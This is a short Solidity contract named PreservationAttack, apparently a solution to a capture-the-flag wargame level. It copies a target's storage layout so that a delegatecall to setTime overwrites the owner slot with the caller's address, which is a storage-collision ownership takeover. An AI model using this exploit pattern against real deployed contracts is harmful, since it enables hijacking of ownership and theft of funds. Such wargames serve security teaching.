// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract PreservationAttack {
    
 address doesnotMatterOne;
 address doesnotMatterTwo;
 address public theOwner;
 uint storedTime;

 function setTime(uint _time) public {
     theOwner = msg.sender;
 }
}